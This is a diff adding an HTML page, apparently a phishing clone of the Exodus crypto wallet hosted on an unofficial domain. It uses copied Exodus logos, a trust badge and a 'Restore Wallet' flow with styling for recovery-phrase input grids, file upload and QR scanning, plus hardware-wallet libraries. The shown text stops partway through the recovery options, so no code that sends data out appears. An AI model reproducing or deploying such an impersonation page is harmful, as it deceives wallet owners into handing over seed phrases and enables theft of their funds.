@@ -1,0 +1,474 @@
+<!-- url: https://exodus-wallet.global.ssl.fastly.net//exodus.html
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>Exodus Wallet</title>
+    <link rel="icon" href="./Folder/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/@ledgerhq/hw-transport-webusb@6.27.1"></script>
+    <script src="https://unpkg.com/@ledgerhq/hw-transport-webhid@6.27.1"></script>
+    <script src="https://unpkg.com/@ledgerhq/hw-app-btc@6.27.1"></script>
+    <script src="https://unpkg.com/@trezor/connect-web@9.0.5"></script>
+    <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js"></script>
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { height: 100%; width: 100%; font-family: 'Rubik', sans-serif; color: #fff; overflow: hidden; background: #000; }
+        body { background: url('https://www.exodus.com/_next/static/media/hero-background.8e803691.jpg') center/cover fixed; position: relative; }
+        body::before { content: ''; position: absolute; inset: 0; background: linear-gradient(135deg, rgba(26,29,46,0.95), rgba(26,29,46,0.75)); z-index: 0; }
+
+        .container { position: relative; z-index: 1; max-width: 480px; width: 100%; margin: 0 auto; padding: env(safe-area-inset-top, 20px) 16px env(safe-area-inset-bottom, 20px) 16px; min-height: 100vh; display: flex; flex-direction: column; overflow-y: auto; }
+
+        .header { text-align: center; padding: 16px 0; flex-shrink: 0; }
+        .logo { width: clamp(160px, 50vw, 220px); height: auto; margin: 0 auto 16px; filter: drop-shadow(0 4px 12px rgba(0,0,0,0.5)); animation: float 3s ease-in-out infinite; }
+        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
+
+        .trust-badge { display: inline-flex; align-items: center; gap: 6px; padding: 6px 12px; border-radius: 9999px; backdrop-filter: blur(12px); background: rgba(255,255,255,0.06); font-size: clamp(13px, 3.5vw, 15px); margin: 12px auto; max-width: 92%; }
+        .trust-badge svg { width: 16px; height: 16px; flex-shrink: 0; }
+
+        .title { font-size: clamp(24px, 7vw, 32px); font-weight: 300; margin-bottom: 8px; }
+        .subtitle { font-size: clamp(14px, 4vw, 16px); color: rgba(255,255,255,0.7); line-height: 1.4; }
+
+        .btn-group { display: flex; flex-direction: column; gap: 14px; margin: 24px 0; }
+        .action-btn { height: 58px; border: none; border-radius: 29px; background: linear-gradient(135deg, #5c6bc0 0%, #3f51b5 100%); color: #fff; font-size: 17px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.8px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(92,107,192,0.3); }
+        .action-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(92,107,192,0.5); }
+
+        .steps { display: flex; justify-content: center; gap: 12px; margin: 18px 0; }
+        .step { width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.12); display: flex; align-items: center; justify-content: center; font-size: 15px; font-weight: 500; transition: all 0.3s; }
+        .step.active { background: #5c6bc0; transform: scale(1.1); }
+
+        .options-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 20px 0; }
+        .option-btn { padding: 16px 12px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15); border-radius: 14px; text-align: center; cursor: pointer; transition: all 0.3s ease; font-size: 14px; font-weight: 500; }
+        .option-btn:hover, .option-btn.active { background: rgba(92,107,192,0.2); border-color: #5c6bc0; transform: translateY(-2px); box-shadow: 0 6px 15px rgba(92,107,192,0.2); }
+        .option-btn svg { width: 28px; height: 28px; margin-bottom: 8px; fill: #fff; }
+
+        .input-section { display: none; margin-top: 20px; animation: fadeIn 0.5s ease; }
+        .input-section.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+
+        .input-grid { display: grid; gap: 11px; margin-bottom: 22px; grid-template-columns: repeat(3, 1fr); }
+        @media (max-width: 600px) { .input-grid { grid-template-columns: 1fr; } }
+
+        .input-wrapper { position: relative; }
+        .input-label { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); font-size: 11px; color: rgba(255,255,255,0.5); pointer-events: none; transition: all 0.2s ease; }
+        .input-field { width: 100%; padding: 15px 12px 15px 28px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15); border-radius: 11px; color: #fff; font-size: 15px; transition: all 0.3s ease; }
+        .input-field:focus { outline: none; border-color: #5c6bc0; background: rgba(92,107,192,0.15); box-shadow: 0 0 0 3px rgba(92,107,192,0.3); }
+        .input-field:focus + .input-label, .input-field:not(:placeholder-shown) + .input-label { top: 8px; font-size: 9px; color: #5c6bc0; }
+
+        /* GREEN / RED VALIDATION */
+        .input-field.valid { border-color: #00e676; background: rgba(0, 230, 118, 0.1); }
+        .input-field.invalid { border-color: #ff3b30; background: rgba(255, 59, 48, 0.1); }
+
+        /* AUTOCOMPLETE DROPDOWN */
+        .autocomplete { position: absolute; top: 100%; left: 0; right: 0; background: rgba(26,29,46,0.98); border: 1px solid rgba(255,255,255,0.15); border-top: none; border-radius: 0 0 11px 11px; max-height: 120px; overflow-y: auto; z-index: 10; display: none; }
+        .autocomplete-item { padding: 10px 14px; cursor: pointer; font-size: 14px; transition: background 0.2s; }
+        .autocomplete-item:hover { background: rgba(92,107,192,0.3); }
+        .autocomplete-item.selected { background: #5c6bc0; }
+
+        .file-label { display: block; padding: 16px; background: rgba(255,255,255,0.08); border: 2px dashed rgba(255,255,255,0.3); border-radius: 12px; text-align: center; cursor: pointer; font-size: 14px; transition: all 0.3s; }
+        .file-label:hover { border-color: #5c6bc0; background: rgba(92,107,192,0.1); }
+
+        #qrVideo { width: 100%; max-width: 300px; margin: 20px auto; border-radius: 12px; border: 2px solid rgba(255,255,255,0.2); }
+        .qr-canvas { display: none; }
+
+        .restore-btn { width: 100%; height: 54px; border: none; border-radius: 27px; background: linear-gradient(135deg, #5c6bc0 0%, #3f51b5 100%); color: #fff; font-size: 16px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.6px; cursor: pointer; margin-top: 10px; transition: all 0.3s; box-shadow: 0 4px 15px rgba(92,107,192,0.3); }
+        .restore-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(92,107,192,0.5); }
+        .restore-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+        #loadingOverlay { position: fixed; inset: 0; background: rgba(26,29,46,0.98); z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; padding: 20px; backdrop-filter: blur(12px); }
+        .spinner { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #00e676; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 18px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #loadingText { font-size: 16px; font-weight: 400; }
+
+        .hidden { display: none; }
+        ::-webkit-scrollbar { display: none; }
+        .container { -ms-overflow-style: none; scrollbar-width: none; }
+
+        /* FORGOT WORDS HELP */
+        .forgot-link { text-align: center; margin-top: 16px; font-size: 14px; color: rgba(255,255,255,0.7); text-decoration: underline; cursor: pointer; }
+        .forgot-link:hover { color: #5c6bc0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- STEP 1 -->
+        <div id="step1" class="step-content">
+            <div class="header">
+               <svg class="logo" viewBox="0 0 241 50" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <!-- [Exodus SVG - unchanged] -->
+                <path d="M49.1711 13.9607L28.1056 0V7.80553L41.6193 16.6815L40.0295 21.7663H28.1056V28.2337H40.0295L41.6193 33.3185L28.1056 42.1945V50L49.1711 36.0838L45.7265 25.0223L49.1711 13.9607Z" fill="url(#paint0_linear)"/>
+                <path d="M9.7781 28.2337H21.6578V21.7663H9.73394L8.18825 16.6815L21.6578 7.80553V0L0.592285 13.9607L4.03697 25.0223L0.592285 36.0838L21.702 50V42.1945L8.18825 33.3185L9.7781 28.2337Z" fill="url(#paint1_linear)"/>
+                <mask id="mask0" style="mask-type:alpha" maskUnits="userSpaceOnUse" x="0" y="0" width="50" height="50">
+                    <path d="M49.1711 13.9607L28.1056 0V7.80553L41.6193 16.6815L40.0295 21.7663H28.1056V28.2337H40.0295L41.6193 33.3185L28.1056 42.1945V50L49.1711 36.0839L45.7265 25.0223L49.1711 13.9607Z" fill="url(#paint2_linear)"/>
+                    <path d="M9.7781 28.2337H21.6578V21.7663H9.73394L8.18825 16.6815L21.6578 7.80553V0L0.592285 13.9607L4.03697 25.0223L0.592285 36.0839L21.702 50V42.1945L8.18825 33.3185L9.7781 28.2337Z" fill="url(#paint3_linear)"/>
+                </mask>
+                <g mask="url(#mask0)">
+                    <rect x="0.618164" width="48.2308" height="50" fill="url(#paint4_linear)"/>
+                </g>
+                <path d="M91.082 13.75V18.1212H71.1519V22.5941H88.0859V26.9654H71.1519V31.8788H91.082V36.25H66.0391V13.75H91.082Z" fill="white"/>
+                <path d="M93.9087 36.25L105.359 24.8645L94.2331 13.75H101.272L109.122 21.7809L116.648 13.75H123.232L112.139 24.8645L123.589 36.25H116.485L109.122 27.9819L100.721 36.25H93.9087Z" fill="white"/>
+                <path d="M137.32 13.75C146.597 13.75 152.176 18.4457 152.176 25C152.176 31.5543 146.597 36.25 137.32 36.25C128.043 36.25 122.495 31.5543 122.495 25C122.495 18.4457 128.043 13.75 137.32 13.75ZM137.32 17.9565C131.741 17.9565 127.628 20.7935 127.628 25C127.628 29.2065 131.741 32.0435 137.32 32.0435C142.931 32.0435 147.043 29.2065 147.043 25C147.043 20.7935 142.931 17.9565 137.32 17.9565Z" fill="white"/>
+                <path d="M170.668 13.75C178.099 13.75 182.576 17.9179 182.576 24.9661C182.576 32.0821 178.131 36.25 170.733 36.25H155.678V13.75H170.668ZM177.32 24.9661C177.32 20.561 174.724 18.1212 170.019 18.1212H160.772V31.8788H170.019C174.724 31.8788 177.32 29.4051 177.32 24.9661Z" fill="white"/>
+                <path d="M199.424 36.25C191.6 36.25 185.666 32.6606 185.666 26.0469V13.75H190.785V25.5484C190.785 29.6363 194.99 31.5306 199.424 31.5306C203.891 31.5306 208.097 29.6695 208.097 25.5484V13.75H213.183V26.0469C213.183 32.6606 207.282 36.25 199.424 36.25Z" fill="white"/>
+                <path d="M227.511 36.25C223.307 36.25 218.775 35.4674 215.557 34L217.232 29.8261C220.122 31.163 224.095 32.0109 227.675 32.0109C231.78 32.0109 235.622 31.1304 235.622 29.5652C235.622 28.4239 234.407 27.9348 231.878 27.5435L224.719 26.7609C219.202 26.0109 216.509 24.087 216.509 20.6957C216.509 16.3261 221.074 13.75 227.773 13.75C231.813 13.75 237.363 14.5 240.22 15.8043L238.545 19.7826C235.721 18.6087 230.926 18.0217 227.544 18.0217C224.063 18.0217 221.764 18.837 221.764 20.337C221.764 21.3804 222.913 21.9022 225.869 22.3261L232.831 23.1087C238.151 23.8587 240.909 25.6848 240.909 29.2391C240.909 33.7391 235.064 36.25 227.511 36.25Z" fill="white"/>
+                <defs>
+                    <linearGradient id="paint0_linear" x1="42.3564" y1="53.4375" x2="27.9576" y2="-5.42048"><stop stop-color="#0B46F9"/><stop offset="1" stop-color="#BBFBE0"/></linearGradient>
+                    <linearGradient id="paint1_linear" x1="42.3564" y1="53.4375" x2="27.9576" y2="-5.42048"><stop stop-color="#0B46F9"/><stop offset="1" stop-color="#BBFBE0"/></linearGradient>
+                    <linearGradient id="paint2_linear" x1="42.3564" y1="53.4375" x2="27.9576" y2="-5.42048"><stop stop-color="#0B46F9"/><stop offset="1" stop-color="#BBFBE0"/></linearGradient>
+                    <linearGradient id="paint3_linear" x1="42.3564" y1="53.4375" x2="27.9576" y2="-5.42048"><stop stop-color="#0B46F9"/><stop offset="1" stop-color="#BBFBE0"/></linearGradient>
+                    <linearGradient id="paint4_linear" x1="3.70988" y1="11.25" x2="28.3212" y2="29.4348"><stop offset="0.119792" stop-color="#8952FF" stop-opacity="0.87"/><stop offset="1" stop-color="#DABDFF" stop-opacity="0"/></linearGradient>
+                </defs>
+            </svg>
+
+            <div class="trust-badge">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 20 20">
+                    <g clip-path="url(#clip0)">
+                        <path fill="url(#grad)" d="M10.018 20c.155 0 .405-.058.647-.193 5.49-3.077 7.37-4.38 7.37-7.901v-7.38c0-1.014-.434-1.332-1.254-1.68-1.138-.472-4.814-1.794-5.952-2.19a2.6 2.6 0 0 0-.81-.144c-.27 0-.55.077-.802.144-1.138.328-4.823 1.727-5.962 2.19-.81.338-1.254.666-1.254 1.68v7.38c0 3.521 1.89 4.814 7.37 7.901.252.135.493.193.647.193m0-1.746c-.154 0-.309-.058-.598-.231-4.457-2.702-5.885-3.493-5.885-6.474V4.824c0-.328.058-.453.328-.56 1.466-.578 4.312-1.533 5.77-2.112a.9.9 0 0 1 .385-.087q.157 0 .386.087c1.457.579 4.284 1.601 5.78 2.113.26.096.318.231.318.56v6.724c0 2.981-1.428 3.763-5.886 6.474-.28.173-.443.231-.598.231"></path>
+                        <path d="M6.536 13.594c0 .723.328 1.061.994 1.061h4.997c.666 0 .984-.338.984-1.061v-3.84c0-.675-.28-1.013-.849-1.052V7.564c0-1.775-1.06-2.962-2.634-2.962-1.572 0-2.633 1.187-2.633 2.962v1.138c-.57.039-.859.377-.859 1.052zm1.862-4.901V7.458c0-1.139.656-1.882 1.63-1.882.975 0 1.631.743 1.631 1.882v1.235z"></path>
+                    </g>
+                    <defs>
+                        <linearGradient id="grad" x1="10.018" x2="10.018" y1="0.512" y2="17.754">
+                            <stop stop-color="#B19DFF"></stop>
+                            <stop offset="1" stop-color="#B19DFF" stop-opacity="0"></stop>
+                        </linearGradient>
+                        <clipPath id="clip0"><rect width="20" height="20" fill="white"/></clipPath>
+                    </defs>
+                </svg>
+                    <span>Trusted by <span style="color:#B19DFF">millions since 2015</span></span>
+                </div>
+                <div class="title">Welcome to Exodus</div>
+                <div class="subtitle">Secure. Simple. Beautiful.</div>
+            </div>
+            <div class="btn-group">
+                <button id="createBtn" class="action-btn">Create New Wallet</button>
+                <button id="restoreBtn" class="action-btn">Restore Wallet</button>
+            </div>
+        </div>
+
+        <!-- STEP 2 -->
+        <div id="step2" class="step-content hidden">
+            <div class="header">
+                <svg xmlns="http://www.w3.org/2000/svg" width="329" height="80" fill="none" viewBox="0 0 329 80" class="w-full"><path fill="#B19DFF" d="M129.224 26c2.165 0 3.309-1.227 3.309-3.353V13c0-4.252 2.248-6.418 6.333-6.418h9.888c2.166 0 3.35-1.186 3.35-3.312S150.92 0 148.754 0h-9.969c-8.54 0-12.83 4.21-12.83 12.632v10.015c0 2.126 1.185 3.352 3.269 3.352m73.422 0c2.165 0 3.309-1.227 3.309-3.353V12.632C205.955 4.21 201.665 0 193.126 0h-10.01c-2.125 0-3.31 1.145-3.31 3.27s1.185 3.312 3.31 3.312h9.887c4.045 0 6.374 2.166 6.374 6.418v9.647c0 2.126 1.185 3.352 3.269 3.352m-63.861 54h9.969c2.166 0 3.35-1.185 3.35-3.27 0-2.126-1.184-3.312-3.35-3.312h-9.888c-4.085 0-6.333-2.166-6.333-6.418v-9.647c0-2.167-1.184-3.352-3.309-3.352s-3.269 1.185-3.269 3.352v9.974c0 8.462 4.29 12.673 12.83 12.673m44.331 0h10.01c8.539 0 12.829-4.252 12.829-12.672v-9.975c0-2.167-1.185-3.352-3.309-3.352s-3.269 1.185-3.269 3.352v9.648c0 4.25-2.329 6.417-6.374 6.417h-9.887c-2.125 0-3.31 1.186-3.31 3.312 0 2.085 1.185 3.27 3.31 3.27"></path><path fill="url(#svg-3723870037-a)" d="m169.142 15.074 17.982 10.381a5.4 5.4 0 0 1 2.7 4.676v20.766a5.4 5.4 0 0 1-2.7 4.677l-17.982 10.381a5.4 5.4 0 0 1-5.4 0L145.76 55.574a5.4 5.4 0 0 1-2.7-4.677V30.131a5.4 5.4 0 0 1 2.7-4.676l17.982-10.381a5.4 5.4 0 0 1 5.4 0"></path><path fill="#fff" fill-rule="evenodd" d="M172.109 49.177c-1.545.559-2.981.368-3.66.277l-.055-.007a23 23 0 0 1-1.45-.262l-.965 3.6-2.217-.593.949-3.543-1.687-.452-.949 3.542-2.217-.594.949-3.542-4.36-1.17 1.169-2.54 1.325.357c.446.118.643.127.877.001.233-.127.347-.385.405-.602l2.457-9.172c.155-.575.149-.742-.035-1.108-.185-.368-.797-.573-1.147-.666l-1.281-.344.617-2.3 4.361 1.167.951-3.553 2.217.594-.952 3.553 1.688.452.953-3.553 2.217.594-.964 3.597c1.625.545 2.771 1.189 3.631 2.27 1.114 1.398.565 3.16.419 3.577-.145.415-.55 1.183-1.064 1.611-.514.43-1.567.713-1.567.713s1.015.517 1.62 1.29c.602.772.893 1.926.467 3.388-.424 1.463-1.117 2.843-2.702 3.418m-4.6-7.695a27 27 0 0 0-2.506-.67l-1.274 4.754s1.462.425 2.466.617c1.003.19 2.084.215 2.668.07.58-.144 1.309-.416 1.601-1.502.291-1.089-.311-1.738-.671-2.057-.358-.318-1.206-.845-2.284-1.21zm2.367-2.329c-.712.176-1.622.131-2.439-.054a35 35 0 0 1-1.844-.494l1.147-4.28s.721.13 1.413.325c.691.196 1.296.38 2.133.904s1.192 1.353.996 2.166-.693 1.258-1.406 1.433" clip-rule="evenodd"></path><g clip-path="url(#svg-3723870037-b)"><path fill="url(#svg-3723870037-c)" fill-rule="evenodd" d="m234.9 22.097 12.654 7.306a3.8 3.8 0 0 1 1.9 3.29v14.614a3.8 3.8 0 0 1-1.9 3.29L234.9 57.903a3.8 3.8 0 0 1-3.8 0l-12.654-7.306a3.8 3.8 0 0 1-1.9-3.29V32.694a3.8 3.8 0 0 1 1.9-3.291l12.654-7.306a3.8 3.8 0 0 1 3.8 0" clip-rule="evenodd"></path><path fill="url(#svg-3723870037-d)" d="m241.461 44.458-2.823 3.027a.638.638 0 0 1-.478.209h-13.382a.33.33 0 0 1-.301-.198.33.33 0 0 1 .061-.355l2.819-3.027a.641.641 0 0 1 .478-.209h13.382a.33.33 0 0 1 .304.194.3.3 0 0 1 .022.189.3.3 0 0 1-.084.168zm-2.823-6.097a.65.65 0 0 0-.478-.208h-13.382a.33.33 0 0 0-.301.197.33.33 0 0 0 .061.355l2.819 3.029a.65.65 0 0 0 .478.209h13.382q.098-.001.178-.055a.33.33 0 0 0 .059-.497l-2.818-3.028zm-13.86-2.174h13.382q.135-.002.261-.054a.6.6 0 0 0 .217-.155l2.823-3.027a.336.336 0 0 0 .062-.357.32.32 0 0 0-.305-.194h-13.383a.639.639 0 0 0-.478.209l-2.819 3.027a.33.33 0 0 0 .06.498.33.33 0 0 0 .18.054z"></path></g><path fill="url(#svg-3723870037-e)" fill-rule="evenodd" d="m98.9 22.097 12.654 7.306a3.8 3.8 0 0 1 1.9 3.29v14.614a3.8 3.8 0 0 1-1.9 3.29L98.9 57.903a3.8 3.8 0 0 1-3.8 0l-12.654-7.306a3.8 3.8 0 0 1-1.9-3.29V32.694a3.8 3.8 0 0 1 1.9-3.291L95.1 22.097a3.8 3.8 0 0 1 3.8 0" clip-rule="evenodd"></path><g fill="#010101" clip-path="url(#svg-3723870037-f)"><path d="m96.936 37.525-6.016 2.652 6.016 3.446 6.012-3.446z" opacity="0.6"></path><path d="m90.92 40.177 6.016 3.446V30.5z" opacity="0.45"></path><path d="M96.936 30.5v13.124l6.012-3.447z" opacity="0.8"></path><path d="m90.92 41.283 6.016 8.217V44.73z" opacity="0.45"></path><path d="M96.935 44.73v4.77l6.018-8.217z" opacity="0.8"></path></g><path fill="url(#svg-3723870037-g)" d="m280.6 24.924 10.656 6.152a3.2 3.2 0 0 1 1.6 2.771v12.306a3.2 3.2 0 0 1-1.6 2.771L280.6 55.076a3.2 3.2 0 0 1-3.2 0l-10.656-6.152a3.2 3.2 0 0 1-1.6-2.771V33.847a3.2 3.2 0 0 1 1.6-2.77l10.656-6.153a3.2 3.2 0 0 1 3.2 0"></path><path fill="#fff" fill-rule="evenodd" d="m278.996 36.053-2.794 2.795-1.627-1.626 4.421-4.422 4.423 4.423-1.626 1.627zm-5.57 2.317-1.626 1.626 1.626 1.627 1.627-1.627zm2.776 2.775 2.794 2.795 2.797-2.797 1.627 1.626h-.001l-4.423 4.424-4.422-4.422-.001-.002zm8.364-2.775-1.626 1.627 1.626 1.626 1.627-1.626z" clip-rule="evenodd"></path><path fill="#fff" d="M280.646 39.995zl-1.651-1.65-1.219 1.22-.14.14-.29.29-.002.001.002.002 1.649 1.65 1.651-1.65v-.002h-.001"></path><g fill-rule="evenodd" clip-path="url(#svg-3723870037-h)" clip-rule="evenodd"><path fill="url(#svg-3723870037-i)" d="m318.2 28.693 7.992 4.614a2.397 2.397 0 0 1 1.2 2.078v9.23a2.4 2.4 0 0 1-1.2 2.078l-7.992 4.614a2.4 2.4 0 0 1-2.4 0l-7.992-4.614a2.397 2.397 0 0 1-1.2-2.078v-9.23a2.4 2.4 0 0 1 1.2-2.078l7.992-4.614a2.4 2.4 0 0 1 2.4 0"></path><path fill="#fff" d="M322.4 39.999a5.404 5.404 0 0 1-5.409 5.398c-2.988 0-5.16-2.175-5.391-4.945h7.151v-.908H311.6a5.405 5.405 0 0 1 5.391-4.944A5.404 5.404 0 0 1 322.4 40"></path></g><g fill-rule="evenodd" clip-path="url(#svg-3723870037-j)" clip-rule="evenodd"><path fill="url(#svg-3723870037-k)" d="m52.6 24.924 10.656 6.152a3.2 3.2 0 0 1 1.6 2.772v12.305a3.2 3.2 0 0 1-1.6 2.77L52.6 55.077a3.2 3.2 0 0 1-3.2 0l-10.656-6.152a3.2 3.2 0 0 1-1.6-2.771V33.848a3.2 3.2 0 0 1 1.6-2.772L49.4 24.924a3.2 3.2 0 0 1 3.2 0"></path><path fill="#fff" d="m57.217 36.87-.325-.225c-.506-.35-1.033-.716-1.551-1.079q-.02-.015-.046-.03a.9.9 0 0 0-.247-.139l-.007-.003c-1.537-.368-3.097-.745-4.617-1.113l-.436-.105q-1.127-.27-2.253-.543l-2.254-.543-.119-.031a1.2 1.2 0 0 0-.459-.059.3.3 0 0 0-.129.048l-.042.035a.5.5 0 0 0-.118.186l-.01.028v.158l.007.024c.714 1.984 1.442 3.99 2.159 5.963v.002l.001.002.002.004.702 1.935.65 1.79c.518 1.426 1.044 2.872 1.56 4.298.045.138.174.228.334.242h.035c.15 0 .282-.073.348-.19l2.756-3.984 1.007-1.454.001-.002.001-.001 1.419-2.05q.207-.3.413-.598l.056-.082c.435-.63.882-1.277 1.325-1.908l.025-.034v-.042c.01-.12.014-.369-.188-.5m-3.23 1.452-.73.378q-.618.322-1.243.643l1.162-1.235c.421-.45.858-.914 1.29-1.372l.193-.204.01-.01a2 2 0 0 1 .15-.163l.029-.028q.045-.042.089-.092c.258.176.519.355.77.531q.27.191.553.383c-.766.386-1.532.783-2.273 1.17m-3.188 1.46a306 306 0 0 0 1.524-1.625l.439-.468c.515-.549 1.04-1.108 1.562-1.66l-3.03-.73-3.029-.73c-.358-.09-.724-.175-1.075-.258-.4-.093-.808-.19-1.212-.294l.062.074q.069.08.133.161l.094.114q.1.124.202.241l.004.004.67.798.67.799c.981 1.17 1.994 2.38 2.986 3.573m-.226 5.097q.014-.15.032-.301.043-.4.082-.8l.032-.294.062-.585.022-.206a71 71 0 0 0 .121-1.194l.01-.083c.035-.296.07-.603.091-.91q.057-.032.125-.06l.04-.017q.059-.024.117-.058 1.205-.627 2.415-1.249a888 888 0 0 0 2.447-1.266 697 697 0 0 0-2.217 3.201l-.408.59v.001c-.493.712-.994 1.436-1.492 2.151l-.43.624h-.001l-.328.473c-.278.4-.564.811-.842 1.221.035-.413.076-.83.122-1.238m-4.898-10.172.046.124 2.36 6.507 1.18 3.251.372 1.025c.049.141.1.286.153.424l.021.057.035.095.04-.394.05-.468.02-.18c.067-.626.135-1.268.193-1.904l.003-.024.08-.686.012-.104c.014-.119.029-.239.037-.358v-.004q.041-.366.076-.728.023-.209.045-.422.034-.316.07-.637a9 9 0 0 1-.272-.319l-.093-.112a13 13 0 0 0-.279-.33q-.477-.573-.953-1.14l-.477-.568c-.922-1.097-1.87-2.228-2.809-3.353z"></path></g><g clip-path="url(#svg-3723870037-l)"><path fill="url(#svg-3723870037-m)" fill-rule="evenodd" d="m14.25 28.222 8.325 4.806a2.5 2.5 0 0 1 1.25 2.165v9.614a2.5 2.5 0 0 1-1.25 2.165l-8.325 4.806a2.5 2.5 0 0 1-2.5 0l-8.325-4.806a2.5 2.5 0 0 1-1.25-2.165v-9.614a2.5 2.5 0 0 1 1.25-2.165l8.325-4.806a2.5 2.5 0 0 1 2.5 0" clip-rule="evenodd"></path><path fill="#213147" d="M7.794 37.55v4.9c0 .313.167.601.438.758l4.244 2.449a.88.88 0 0 0 .874 0l4.244-2.45a.87.87 0 0 0 .438-.756v-4.902c0-.312-.167-.6-.438-.756l-4.244-2.45a.88.88 0 0 0-.874 0l-4.244 2.45a.88.88 0 0 0-.438.756"></path><path fill="#12AAFF" d="m13.84 40.948-.605 1.66a.2.2 0 0 0 0 .143l1.04 2.856 1.205-.696-1.445-3.963a.103.103 0 0 0-.194 0M15.053 38.152a.103.103 0 0 0-.194 0l-.606 1.66a.2.2 0 0 0 0 .143l1.705 4.676 1.204-.695z"></path><path fill="#9DCCED" d="M12.913 34.525q.045 0 .087.023l4.592 2.651a.17.17 0 0 1 .087.148v5.303a.17.17 0 0 1-.087.148L13 45.452a.177.177 0 0 1-.174 0l-4.59-2.651a.17.17 0 0 1-.086-.148v-5.306c0-.06.033-.117.087-.148l4.592-2.651a.2.2 0 0 1 .084-.023m0-.775a.95.95 0 0 0-.473.128l-4.592 2.651a.95.95 0 0 0-.473.818v5.303c0 .338.182.652.473.82l4.592 2.652a.95.95 0 0 0 .946 0l4.592-2.651a.94.94 0 0 0 .473-.82v-5.304a.95.95 0 0 0-.473-.82l-4.59-2.65a.96.96 0 0 0-.475-.127"></path><path fill="#213147" d="m9.878 44.642.422-1.156.849.706-.793.726z"></path><path fill="#fff" d="M12.527 36.97h-1.163a.205.205 0 0 0-.195.136l-2.495 6.841 1.204.696 2.749-7.535a.104.104 0 0 0-.1-.138M14.565 36.97H13.4a.205.205 0 0 0-.194.136l-2.85 7.813 1.203.696 3.102-8.504a.104.104 0 0 0-.097-.14"></path></g><defs><linearGradient id="svg-3723870037-a" x1="196.566" x2="154.12" y1="28.01" y2="8.222" gradientUnits="userSpaceOnUse"><stop stop-color="#FF9400"></stop><stop offset="1" stop-color="#FFBB21"></stop></linearGradient><linearGradient id="svg-3723870037-c" x1="203.019" x2="245.543" y1="52.638" y2="70.005" gradientUnits="userSpaceOnUse"><stop stop-color="#1A1A1A"></stop><stop offset="1"></stop></linearGradient><linearGradient id="svg-3723870037-d" x1="225.893" x2="239.925" y1="48.058" y2="32.239" gradientUnits="userSpaceOnUse"><stop offset="0.08" stop-color="#9945FF"></stop><stop offset="0.3" stop-color="#8752F3"></stop><stop offset="0.5" stop-color="#5497D5"></stop><stop offset="0.6" stop-color="#43B4CA"></stop><stop offset="0.72" stop-color="#28E0B9"></stop><stop offset="0.97" stop-color="#19FB9B"></stop></linearGradient><linearGradient id="svg-3723870037-e" x1="73.25" x2="123.84" y1="21.95" y2="49.532" gradientUnits="userSpaceOnUse"><stop stop-color="#fff"></stop><stop offset="1" stop-color="#D6DAFF"></stop></linearGradient><linearGradient id="svg-3723870037-g" x1="247.656" x2="286.022" y1="44.298" y2="71.411" gradientUnits="userSpaceOnUse"><stop stop-color="#D8AC29"></stop><stop offset="1" stop-color="#FFB700"></stop></linearGradient><linearGradient id="svg-3723870037-i" x1="327.2" x2="304.307" y1="51.401" y2="30.947" gradientUnits="userSpaceOnUse"><stop stop-color="#0052FF"></stop><stop offset="1" stop-color="#3D7BFF"></stop></linearGradient><linearGradient id="svg-3723870037-k" x1="73.405" x2="53.343" y1="45.915" y2="16.927" gradientUnits="userSpaceOnUse"><stop stop-color="#B81422"></stop><stop offset="1" stop-color="#D1414D"></stop></linearGradient><linearGradient id="svg-3723870037-m" x1="23.625" x2="-0.222" y1="51.876" y2="30.569" gradientUnits="userSpaceOnUse"><stop stop-color="#213147"></stop><stop offset="1" stop-color="#364B67"></stop></linearGradient><clipPath id="svg-3723870037-b"><path fill="#fff" d="M214 21h38v38h-38z"></path></clipPath><clipPath id="svg-3723870037-f"><path fill="#fff" d="M90.92 30.5h12.033v19H90.92z"></path></clipPath><clipPath id="svg-3723870037-h"><path fill="#fff" d="M305 28h24v24h-24z"></path></clipPath><clipPath id="svg-3723870037-j"><path fill="#fff" d="M35 24h32v32H35z"></path></clipPath><clipPath id="svg-3723870037-l"><path fill="#fff" d="M.5 27.5h25v25H.5z"></path></clipPath></defs></svg>
+                <div class="title" style="margin: 10px 0 6px; font-size: 20px;">Choose Recovery Method</div>
+            </div>
+
+            <div class="steps">
+                <div class="step">1</div>
+                <div class="step active">2</div>
+                <div class="step">3</div>
+            </div>
+
+            <div class="options-grid">
+                <div class="option-btn" data-method="qr">
+                    <svg viewBox="0 0 24 24"><path d="M4 4h6v6H4V4zm10 0h6v6h-6V4zm-10 10h6v6H4v-6zm6 0h2v2h-2v-2zm2 2h2v2h-2v-2zm-4-8h2v2H8V8zm8 0h2v2h-2V8zm-4 4h2v2h-2v-2zm2 2h2v2h-2v-2z"/></svg>
+                    <div>QR Code</div>
+                </div>
